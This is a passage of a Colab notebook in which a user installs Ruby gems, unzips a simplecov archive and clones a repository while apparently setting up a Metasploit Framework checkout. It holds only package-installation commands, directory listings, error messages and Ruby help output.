            "1 gem installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install bundle"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "qgmJodGUs2uk",
        "outputId": "aff504af-3b9f-490c-ade0-6bd893f3baa3"
      },
      "execution_count": 72,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching bundle-0.0.1.gem\n",
            "Successfully installed bundle-0.0.1\n",
            "Parsing documentation for bundle-0.0.1\n",
            "Installing ri documentation for bundle-0.0.1\n",
            "Done installing documentation for bundle after 0 seconds\n",
            "1 gem installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install simplecov 0.18.2"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "JNyT1slTs73q",
        "outputId": "98c6903f-cd07-4661-f8df-2c081849a0f2"
      },
      "execution_count": 83,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Successfully installed simplecov-0.22.0\n",
            "Parsing documentation for simplecov-0.22.0\n",
            "Done installing documentation for simplecov after 0 seconds\n",
            "ERROR:  Could not find a valid gem '0.18.2' (>= 0) in any repository\n",
            "1 gem installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "z_dwjJKOwK1b",
        "outputId": "d43bc678-6e0c-426d-fdee-bc01ea4301cf"
      },
      "execution_count": 89,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34mapp\u001b[0m/                         \u001b[01;34mdocumentation\u001b[0m/                \u001b[01;32mmsfrpc\u001b[0m*\n",
            "\u001b[01;34mbitcoin\u001b[0m/                     \u001b[01;34mexternal\u001b[0m/                     \u001b[01;32mmsfrpcd\u001b[0m*\n",
            "CODE_OF_CONDUCT.md           Gemfile                       \u001b[01;32mmsfupdate\u001b[0m*\n",
            "\u001b[01;34mconfig\u001b[0m/                      Gemfile.local.example         \u001b[01;32mmsfvenom\u001b[0m*\n",
            "CONTRIBUTING.md              Gemfile.lock                  msf-ws.ru\n",
            "COPYING                      \u001b[01;34mkubernetes\u001b[0m/                   \u001b[01;34mplugins\u001b[0m/\n",
            "cortex.yaml                  \u001b[01;34mlib\u001b[0m/                          \u001b[01;32mRakefile\u001b[0m*\n",
            "CURRENT.md                   LICENSE                       README.md\n",
            "\u001b[01;34mdata\u001b[0m/                        LICENSE_GEMS                  \u001b[01;34mscript\u001b[0m/\n",
            "\u001b[01;34mdb\u001b[0m/                          metasploit-framework.gemspec  \u001b[01;34mscripts\u001b[0m/\n",
            "\u001b[01;34mdocker\u001b[0m/                      \u001b[01;34mmodules\u001b[0m/                      simplecov-0.18.2.zip\n",
            "docker-compose.override.yml  \u001b[01;32mmsfconsole\u001b[0m*                   \u001b[01;34mspec\u001b[0m/\n",
            "docker-compose.yml           \u001b[01;32mmsfd\u001b[0m*                         \u001b[01;34mtest\u001b[0m/\n",
            "Dockerfile                   \u001b[01;32mmsfdb\u001b[0m*                        \u001b[01;34mtools\u001b[0m/\n",
            "\u001b[01;34mdocs\u001b[0m/                        msf-json-rpc.ru               Vagrantfile\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!unzip  simplecov-0.18.2.zip"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Bd7MZsZwwZYm",
        "outputId": "3a4ae583-3a8b-4e15-e8fa-3880b2031934"
      },
      "execution_count": 90,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Archive:  simplecov-0.18.2.zip\n",
            "0d0f6927f2949bfe3fd9d6adc7ef7b4c8d7a3488\n",
            "   creating: simplecov-0.18.2/\n",
            "   creating: simplecov-0.18.2/.github/\n",
            "   creating: simplecov-0.18.2/.github/workflows/\n",
            "  inflating: simplecov-0.18.2/.github/workflows/stable.yml  \n",
            "  inflating: simplecov-0.18.2/.github/workflows/unstable.yml  \n",
            "  inflating: simplecov-0.18.2/.gitignore  \n",
            " extracting: simplecov-0.18.2/.rspec  \n",
            "  inflating: simplecov-0.18.2/.rubocop.yml  \n",
            " extracting: simplecov-0.18.2/.yardopts  \n",
            "  inflating: simplecov-0.18.2/CHANGELOG.md  \n",
            "  inflating: simplecov-0.18.2/CODE_OF_CONDUCT.md  \n",
            "  inflating: simplecov-0.18.2/CONTRIBUTING.md  \n",
            "  inflating: simplecov-0.18.2/Gemfile  \n",
            "  inflating: simplecov-0.18.2/Gemfile.lock  \n",
            "  inflating: simplecov-0.18.2/ISSUE_TEMPLATE.md  \n",
            "  inflating: simplecov-0.18.2/LICENSE  \n",
            "  inflating: simplecov-0.18.2/README.md  \n",
            "  inflating: simplecov-0.18.2/Rakefile  \n",
            "   creating: simplecov-0.18.2/benchmarks/\n",
            "  inflating: simplecov-0.18.2/benchmarks/result.rb  \n",
            "  inflating: simplecov-0.18.2/cucumber.yml  \n",
            "   creating: simplecov-0.18.2/doc/\n",
            "  inflating: simplecov-0.18.2/doc/alternate-formatters.md  \n",
            "  inflating: simplecov-0.18.2/doc/commercial-services.md  \n",
            "  inflating: simplecov-0.18.2/doc/editor-integration.md  \n",
            "   creating: simplecov-0.18.2/features/\n",
            "  inflating: simplecov-0.18.2/features/branch_coverage.feature  \n",
            "  inflating: simplecov-0.18.2/features/config_autoload.feature  \n",
            "  inflating: simplecov-0.18.2/features/config_command_name.feature  \n",
            "  inflating: simplecov-0.18.2/features/config_coverage_dir.feature  \n",
            "  inflating: simplecov-0.18.2/features/config_deactivate_merging.feature  \n",
            "  inflating: simplecov-0.18.2/features/config_formatters.feature  \n",
            "  inflating: simplecov-0.18.2/features/config_merge_timeout.feature  \n",
            "  inflating: simplecov-0.18.2/features/config_nocov_token.feature  \n",
            "  inflating: simplecov-0.18.2/features/config_profiles.feature  \n",
            "  inflating: simplecov-0.18.2/features/config_project_name.feature  \n",
            "  inflating: simplecov-0.18.2/features/config_styles.feature  \n",
            "  inflating: simplecov-0.18.2/features/config_tracked_files.feature  \n",
            "  inflating: simplecov-0.18.2/features/config_tracked_files_relevant_lines.feature  \n",
            "  inflating: simplecov-0.18.2/features/cucumber_basic.feature  \n",
            "  inflating: simplecov-0.18.2/features/maximum_coverage_drop.feature  \n",
            "  inflating: simplecov-0.18.2/features/merging_test_unit_and_rspec.feature  \n",
            "  inflating: simplecov-0.18.2/features/minimum_coverage.feature  \n",
            "  inflating: simplecov-0.18.2/features/old_version_json.feature  \n",
            "  inflating: simplecov-0.18.2/features/parallel_tests.feature  \n",
            "  inflating: simplecov-0.18.2/features/refuse_coverage_drop.feature  \n",
            "  inflating: simplecov-0.18.2/features/rspec_basic.feature  \n",
            "  inflating: simplecov-0.18.2/features/rspec_fails_on_initialization.feature  \n",
            "  inflating: simplecov-0.18.2/features/rspec_groups_and_filters_basic.feature  \n",
            "  inflating: simplecov-0.18.2/features/rspec_groups_and_filters_complex.feature  \n",
            "  inflating: simplecov-0.18.2/features/rspec_groups_using_filter_class.feature  \n",
            "  inflating: simplecov-0.18.2/features/rspec_without_simplecov.feature  \n",
            "  inflating: simplecov-0.18.2/features/skipping_code_blocks_manually.feature  \n",
            "   creating: simplecov-0.18.2/features/step_definitions/\n",
            "  inflating: simplecov-0.18.2/features/step_definitions/html_steps.rb  \n",
            "  inflating: simplecov-0.18.2/features/step_definitions/old_coverage_json_steps.rb  \n",
            "  inflating: simplecov-0.18.2/features/step_definitions/parallel_tests_steps.rb  \n",
            "  inflating: simplecov-0.18.2/features/step_definitions/parameter_types.rb  \n",
            "  inflating: simplecov-0.18.2/features/step_definitions/simplecov_steps.rb  \n",
            "  inflating: simplecov-0.18.2/features/step_definitions/web_steps.rb  \n",
            "   creating: simplecov-0.18.2/features/support/\n",
            "  inflating: simplecov-0.18.2/features/support/env.rb  \n",
            "  inflating: simplecov-0.18.2/features/test_unit_basic.feature  \n",
            "  inflating: simplecov-0.18.2/features/test_unit_collate.feature  \n",
            "  inflating: simplecov-0.18.2/features/test_unit_groups_and_filters_basic.feature  \n",
            "  inflating: simplecov-0.18.2/features/test_unit_groups_and_filters_complex.feature  \n",
            "  inflating: simplecov-0.18.2/features/test_unit_groups_using_filter_class.feature  \n",
            "  inflating: simplecov-0.18.2/features/test_unit_without_simplecov.feature  \n",
            "  inflating: simplecov-0.18.2/features/unicode_compatiblity.feature  \n",
            "   creating: simplecov-0.18.2/lib/\n",
            "  inflating: simplecov-0.18.2/lib/simplecov.rb  \n",
            "   creating: simplecov-0.18.2/lib/simplecov/\n",
            "  inflating: simplecov-0.18.2/lib/simplecov/combine.rb  \n",
            "   creating: simplecov-0.18.2/lib/simplecov/combine/\n",
            "  inflating: simplecov-0.18.2/lib/simplecov/combine/branches_combiner.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/combine/files_combiner.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/combine/lines_combiner.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/combine/results_combiner.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/command_guesser.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/configuration.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/coverage_statistics.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/defaults.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/exit_codes.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/file_list.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/filter.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/formatter.rb  \n",
            "   creating: simplecov-0.18.2/lib/simplecov/formatter/\n",
            "  inflating: simplecov-0.18.2/lib/simplecov/formatter/multi_formatter.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/formatter/simple_formatter.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/last_run.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/lines_classifier.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/load_global_config.rb  \n",
            " extracting: simplecov-0.18.2/lib/simplecov/no_defaults.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/profiles.rb  \n",
            "   creating: simplecov-0.18.2/lib/simplecov/profiles/\n",
            "  inflating: simplecov-0.18.2/lib/simplecov/profiles/bundler_filter.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/profiles/hidden_filter.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/profiles/rails.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/profiles/root_filter.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/profiles/test_frameworks.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/result.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/result_adapter.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/result_merger.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/simulate_coverage.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/source_file.rb  \n",
            "   creating: simplecov-0.18.2/lib/simplecov/source_file/\n",
            "  inflating: simplecov-0.18.2/lib/simplecov/source_file/branch.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/source_file/line.rb  \n",
            "  inflating: simplecov-0.18.2/lib/simplecov/useless_results_remover.rb  \n",
            " extracting: simplecov-0.18.2/lib/simplecov/version.rb  \n",
            "  inflating: simplecov-0.18.2/simplecov.gemspec  \n",
            "   creating: simplecov-0.18.2/spec/\n",
            "   creating: simplecov-0.18.2/spec/combine/\n",
            "  inflating: simplecov-0.18.2/spec/combine/results_combiner_spec.rb  \n",
            "  inflating: simplecov-0.18.2/spec/command_guesser_spec.rb  \n",
            "  inflating: simplecov-0.18.2/spec/config_loader_spec.rb  \n",
            "  inflating: simplecov-0.18.2/spec/configuration_spec.rb  \n",
            "  inflating: simplecov-0.18.2/spec/coverage_statistics_spec.rb  \n",
            "  inflating: simplecov-0.18.2/spec/defaults_spec.rb  \n",
            "  inflating: simplecov-0.18.2/spec/deleted_source_spec.rb  \n",
            "  inflating: simplecov-0.18.2/spec/file_list_spec.rb  \n",
            "  inflating: simplecov-0.18.2/spec/filters_spec.rb  \n",
            "   creating: simplecov-0.18.2/spec/fixtures/\n",
            "   creating: simplecov-0.18.2/spec/fixtures/app/\n",
            "   creating: simplecov-0.18.2/spec/fixtures/app/controllers/\n",
            "  inflating: simplecov-0.18.2/spec/fixtures/app/controllers/sample_controller.rb  \n",
            "   creating: simplecov-0.18.2/spec/fixtures/app/models/\n",
            "  inflating: simplecov-0.18.2/spec/fixtures/app/models/user.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/branch_tester_script.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/branches.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/case.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/case_without_else.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/coverer.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/deleted_source_sample.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/elsif.rb  \n",
            "   creating: simplecov-0.18.2/spec/fixtures/frameworks/\n",
            "  inflating: simplecov-0.18.2/spec/fixtures/frameworks/rspec_bad.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/frameworks/rspec_good.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/frameworks/testunit_bad.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/frameworks/testunit_good.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/inline.rb  \n",
            " extracting: simplecov-0.18.2/spec/fixtures/iso-8859.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/nested_branches.rb  \n",
            " extracting: simplecov-0.18.2/spec/fixtures/never.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/nocov_complex.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/resultset1.rb  \n",
            " extracting: simplecov-0.18.2/spec/fixtures/resultset2.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/sample.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/single_nocov.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/skipped.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/skipped_and_executed.rb  \n",
            "  inflating: simplecov-0.18.2/spec/fixtures/uneven_nocovs.rb  \n",
            " extracting: simplecov-0.18.2/spec/fixtures/utf-8.rb  \n",
            "  inflating: simplecov-0.18.2/spec/gemspec_spec.rb  \n",
            "  inflating: simplecov-0.18.2/spec/helper.rb  \n",
            "  inflating: simplecov-0.18.2/spec/last_run_spec.rb  \n",
            "  inflating: simplecov-0.18.2/spec/lines_classifier_spec.rb  \n",
            "  inflating: simplecov-0.18.2/spec/multi_formatter_spec.rb  \n",
            "  inflating: simplecov-0.18.2/spec/result_merger_spec.rb  \n",
            "  inflating: simplecov-0.18.2/spec/result_spec.rb  \n",
            "  inflating: simplecov-0.18.2/spec/return_codes_spec.rb  \n",
            "  inflating: simplecov-0.18.2/spec/simplecov_spec.rb  \n",
            "   creating: simplecov-0.18.2/spec/source_file/\n",
            "  inflating: simplecov-0.18.2/spec/source_file/branch_spec.rb  \n",
            "  inflating: simplecov-0.18.2/spec/source_file/line_spec.rb  \n",
            "  inflating: simplecov-0.18.2/spec/source_file_spec.rb  \n",
            "   creating: simplecov-0.18.2/spec/support/\n",
            "  inflating: simplecov-0.18.2/spec/support/fail_rspec_on_ruby_warning.rb  \n",
            "  inflating: simplecov-0.18.2/spec/useless_results_remover_spec.rb  \n",
            "   creating: simplecov-0.18.2/test_projects/\n",
            "   creating: simplecov-0.18.2/test_projects/faked_project/\n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/Rakefile  \n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/cucumber.yml  \n",
            "   creating: simplecov-0.18.2/test_projects/faked_project/features/\n",
            "   creating: simplecov-0.18.2/test_projects/faked_project/features/step_definitions/\n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/features/step_definitions/my_steps.rb  \n",
            "   creating: simplecov-0.18.2/test_projects/faked_project/features/support/\n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/features/support/env.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/features/test_stuff.feature  \n",
            "   creating: simplecov-0.18.2/test_projects/faked_project/lib/\n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/lib/faked_project.rb  \n",
            "   creating: simplecov-0.18.2/test_projects/faked_project/lib/faked_project/\n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/lib/faked_project/framework_specific.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/lib/faked_project/meta_magic.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/lib/faked_project/some_class.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/lib/faked_project/untested_class.rb  \n",
            "   creating: simplecov-0.18.2/test_projects/faked_project/spec/\n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/spec/faked_spec.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/spec/forking_spec.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/spec/meta_magic_spec.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/spec/some_class_spec.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/spec/spec_helper.rb  \n",
            "   creating: simplecov-0.18.2/test_projects/faked_project/test/\n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/test/faked_test.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/test/meta_magic_test.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/test/some_class_test.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/faked_project/test/test_helper.rb  \n",
            "   creating: simplecov-0.18.2/test_projects/old_coverage_json/\n",
            " extracting: simplecov-0.18.2/test_projects/old_coverage_json/.rspec  \n",
            "   creating: simplecov-0.18.2/test_projects/old_coverage_json/coverage/\n",
            "  inflating: simplecov-0.18.2/test_projects/old_coverage_json/coverage/.last_run.json  \n",
            "  inflating: simplecov-0.18.2/test_projects/old_coverage_json/coverage/.resultset.json  \n",
            " extracting: simplecov-0.18.2/test_projects/old_coverage_json/coverage/.resultset.json.lock  \n",
            "   creating: simplecov-0.18.2/test_projects/old_coverage_json/lib/\n",
            "  inflating: simplecov-0.18.2/test_projects/old_coverage_json/lib/code.rb  \n",
            "   creating: simplecov-0.18.2/test_projects/old_coverage_json/spec/\n",
            "  inflating: simplecov-0.18.2/test_projects/old_coverage_json/spec/code_spec.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/old_coverage_json/spec/spec_helper.rb  \n",
            "   creating: simplecov-0.18.2/test_projects/parallel_tests/\n",
            " extracting: simplecov-0.18.2/test_projects/parallel_tests/.rspec  \n",
            "  inflating: simplecov-0.18.2/test_projects/parallel_tests/Gemfile  \n",
            "  inflating: simplecov-0.18.2/test_projects/parallel_tests/Gemfile.lock  \n",
            "   creating: simplecov-0.18.2/test_projects/parallel_tests/lib/\n",
            "  inflating: simplecov-0.18.2/test_projects/parallel_tests/lib/a.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/parallel_tests/lib/all.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/parallel_tests/lib/b.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/parallel_tests/lib/c.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/parallel_tests/lib/d.rb  \n",
            "   creating: simplecov-0.18.2/test_projects/parallel_tests/spec/\n",
            "  inflating: simplecov-0.18.2/test_projects/parallel_tests/spec/a_spec.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/parallel_tests/spec/b_spec.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/parallel_tests/spec/c_spec.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/parallel_tests/spec/d_spec.rb  \n",
            "  inflating: simplecov-0.18.2/test_projects/parallel_tests/spec/spec_helper.rb  \n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "KoFZ3FtbwmyG",
        "outputId": "10cbefab-b34e-4ee8-ff92-114d8ec52773"
      },
      "execution_count": 91,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34mapp\u001b[0m/                         \u001b[01;34mexternal\u001b[0m/                     \u001b[01;32mmsfupdate\u001b[0m*\n",
            "\u001b[01;34mbitcoin\u001b[0m/                     Gemfile                       \u001b[01;32mmsfvenom\u001b[0m*\n",
            "CODE_OF_CONDUCT.md           Gemfile.local.example         msf-ws.ru\n",
            "\u001b[01;34mconfig\u001b[0m/                      Gemfile.lock                  \u001b[01;34mplugins\u001b[0m/\n",
            "CONTRIBUTING.md              \u001b[01;34mkubernetes\u001b[0m/                   \u001b[01;32mRakefile\u001b[0m*\n",
            "COPYING                      \u001b[01;34mlib\u001b[0m/                          README.md\n",
            "cortex.yaml                  LICENSE                       \u001b[01;34mscript\u001b[0m/\n",
            "CURRENT.md                   LICENSE_GEMS                  \u001b[01;34mscripts\u001b[0m/\n",
            "\u001b[01;34mdata\u001b[0m/                        metasploit-framework.gemspec  \u001b[01;34msimplecov-0.18.2\u001b[0m/\n",
            "\u001b[01;34mdb\u001b[0m/                          \u001b[01;34mmodules\u001b[0m/                      simplecov-0.18.2.tar.gz\n",
            "\u001b[01;34mdocker\u001b[0m/                      \u001b[01;32mmsfconsole\u001b[0m*                   simplecov-0.18.2.zip\n",
            "docker-compose.override.yml  \u001b[01;32mmsfd\u001b[0m*                         \u001b[01;34mspec\u001b[0m/\n",
            "docker-compose.yml           \u001b[01;32mmsfdb\u001b[0m*                        \u001b[01;34mtest\u001b[0m/\n",
            "Dockerfile                   msf-json-rpc.ru               \u001b[01;34mtools\u001b[0m/\n",
            "\u001b[01;34mdocs\u001b[0m/                        \u001b[01;32mmsfrpc\u001b[0m*                       Vagrantfile\n",
            "\u001b[01;34mdocumentation\u001b[0m/               \u001b[01;32mmsfrpcd\u001b[0m*\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!git install https://github.com/Fedu1ov/BoB/blob/55cba4ff85db29eb8fde0d9ddd30950c06bf973e/simplecov-0.18.2.zip"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "4cAHbN9bw3qC",
        "outputId": "5e9fd4dd-1c03-4546-832c-d7635edbfcd5"
      },
      "execution_count": 94,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "git: 'install' is not a git command. See 'git --help'.\n",
            "\n",
            "The most similar command is\n",
            "\tinstaweb\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!git clone https://github.com/Fedu1ov/metaspot.git"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "zt6hDdbtxzpj",
        "outputId": "ae7e6a8d-e8aa-4c63-8010-2098f39fa2b4"
      },
      "execution_count": 95,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Cloning into 'metaspot'...\n",
            "remote: Enumerating objects: 17, done.\u001b[K\n",
            "remote: Counting objects: 100% (17/17), done.\u001b[K\n",
            "remote: Compressing objects: 100% (15/15), done.\u001b[K\n",
            "remote: Total 17 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)\u001b[K\n",
            "Receiving objects: 100% (17/17), 31.26 KiB | 1.25 MiB/s, done.\n",
            "Resolving deltas: 100% (1/1), done.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!ruby --help"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "_qgN69L7x5sZ",
        "outputId": "3b9b2a41-ffa9-4790-e3aa-faf801d057ee"
      },
      "execution_count": 112,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[1;7mUsage:\u001b[0m ruby [switches] [--] [programfile] [arguments]\n",
            "  \u001b[1m-0[octal]                 \u001b[0mspecify record separator (\\0, if no argument)\n",
            "  \u001b[1m-a                        \u001b[0mautosplit mode with -n or -p (splits $_ into $F)\n",
            "  \u001b[1m-c                        \u001b[0mcheck syntax only\n",
            "  \u001b[1m-Cdirectory               \u001b[0mcd to directory before executing your script\n",
            "  \u001b[1m-d, --debug               \u001b[0mset debugging flags (set $DEBUG to true)\n",
            "  \u001b[1m-e 'command'              \u001b[0mone line of script. Several -e's allowed. Omit [programfile]\n",
            "  \u001b[1m-Eex[:in], --encoding=ex[:in]\u001b[0m\n",
            "                            specify the default external and internal character encodings\n",
            "  \u001b[1m-Fpattern                 \u001b[0msplit() pattern for autosplit (-a)\n",
            "  \u001b[1m-i[extension]             \u001b[0medit ARGV files in place (make backup if extension supplied)\n",
            "  \u001b[1m-Idirectory               \u001b[0mspecify $LOAD_PATH directory (may be used more than once)\n",
            "  \u001b[1m-l                        \u001b[0menable line ending processing\n",
            "  \u001b[1m-n                        \u001b[0massume 'while gets(); ... end' loop around your script\n",
            "  \u001b[1m-p                        \u001b[0massume loop like -n but print line also like sed\n",
            "  \u001b[1m-rlibrary                 \u001b[0mrequire the library before executing your script\n",
            "  \u001b[1m-s                        \u001b[0menable some switch parsing for switches after script name\n",
            "  \u001b[1m-S                        \u001b[0mlook for the script using PATH environment variable\n",
            "  \u001b[1m-v                        \u001b[0mprint the version number, then turn on verbose mode\n",
            "  \u001b[1m-w                        \u001b[0mturn warnings on for your script\n",
            "  \u001b[1m-W[level=2|:category]     \u001b[0mset warning level; 0=silence, 1=medium, 2=verbose\n",
            "  \u001b[1m-x[directory]             \u001b[0mstrip off text before #!ruby line and perhaps cd to directory\n",
            "  \u001b[1m--jit                     \u001b[0menable JIT with default options (experimental)\n",
            "  \u001b[1m--jit-[option]            \u001b[0menable JIT with an option (experimental)\n",
            "  \u001b[1m--copyright               \u001b[0mprint the copyright\n",
            "  \u001b[1m--dump={insns|parsetree|...}[,...]\u001b[0m\n",
            "                            dump debug information. see below for available dump list\n",
            "  \u001b[1m--enable={gems|rubyopt|...}[,...], --disable={gems|rubyopt|...}[,...]\u001b[0m\n",
            "                            enable or disable features. see below for available features\n",
            "  \u001b[1m--external-encoding=encoding, --internal-encoding=encoding\u001b[0m\n",
            "                            specify the default external or internal character encoding\n",
            "  \u001b[1m--verbose                 \u001b[0mturn on verbose mode and disable script from stdin\n",
            "  \u001b[1m--version                 \u001b[0mprint the version number, then exit\n",
            "  \u001b[1m--help                    \u001b[0mshow this message, -h for short message\n",
            "  \u001b[1m--backtrace-limit=num     \u001b[0mlimit the maximum length of backtrace\n",
            "\n",
            "\u001b[1;7mDump List:\u001b[0m\n",
            "  \u001b[1minsns                     \u001b[0minstruction sequences\n",
            "  \u001b[1myydebug                   \u001b[0myydebug of yacc parser generator\n",
            "  \u001b[1mparsetree                 \u001b[0mAST\n",
            "  \u001b[1mparsetree_with_comment    \u001b[0mAST with comments\n",
            "\n",
            "\u001b[1;7mFeatures:\u001b[0m\n",
            "  \u001b[1mgems                      \u001b[0mrubygems (default: enabled)\n",
            "  \u001b[1mdid_you_mean              \u001b[0mdid_you_mean (default: enabled)\n",
            "  \u001b[1mrubyopt                   \u001b[0mRUBYOPT environment variable (default: enabled)\n",
            "  \u001b[1mfrozen-string-literal     \u001b[0mfreeze all string literals (default: disabled)\n",
            "  \u001b[1mjit                       \u001b[0mJIT compiler (default: disabled)\n",
            "\n",
            "\u001b[1;7mWarning categories:\u001b[0m\n",
            "  \u001b[1mdeprecated                \u001b[0mdeprecated features\n",
            "  \u001b[1mexperimental              \u001b[0mexperimental features\n",
            "\n",
            "\u001b[1;7mJIT options (experimental):\u001b[0m\n",
            "  \u001b[1m--jit-warnings            \u001b[0mEnable printing JIT warnings\n",
            "  \u001b[1m--jit-debug               \u001b[0mEnable JIT debugging (very slow), or add cflags if specified\n",
            "  \u001b[1m--jit-wait                \u001b[0mWait until JIT compilation finishes every time (for testing)\n",
            "  \u001b[1m--jit-save-temps          \u001b[0mSave JIT temporary files in $TMP or /tmp (for testing)\n",
            "  \u001b[1m--jit-verbose=num         \u001b[0mPrint JIT logs of level num or less to stderr (default: 0)\n",
            "  \u001b[1m--jit-max-cache=num       \u001b[0mMax number of methods to be JIT-ed in a cache (default: 100)\n",
            "  \u001b[1m--jit-min-calls=num       \u001b[0mNumber of calls to trigger JIT (for testing, default: 10000)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install ruby simplecov-0.18.2"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "qJ9sE3oB0rcU",
        "outputId": "7e6bbaf8-940e-4254-c2bc-c33728477743"
      },
      "execution_count": 123,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Successfully installed ruby-0.1.0\n",
            "Parsing documentation for ruby-0.1.0\n",
            "Done installing documentation for ruby after 0 seconds\n",
            "ERROR:  Could not find a valid gem 'simplecov-0.18.2' (>= 0) in any repository\n",
